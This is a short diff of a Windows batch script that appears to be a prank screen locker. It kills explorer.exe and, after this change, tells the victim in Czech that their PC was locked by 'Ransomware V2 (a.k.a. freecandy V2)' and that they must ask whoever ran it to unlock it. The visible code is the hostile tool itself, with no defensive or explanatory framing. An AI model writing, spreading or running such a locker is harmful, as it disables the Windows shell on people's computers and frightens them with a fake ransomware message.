@@ -3,8 +3,8 @@ taskkill /f /im explorer.exe
 :resett
 cls
 color a
-echo Admin tohoto pocitace tento pocitac zamkl.
-echo Admin musi tento pocitac odemknout, takze musis jen cekat.
+echo Tvuj PC byl zamknut pomoci Ransomware V2 (a.k.a. freecandy V2)
+echo Pro odemceni se zeptejte osoby, ktera tento program spustila.
 pause
 
 setlocal enabledelayedexpansion
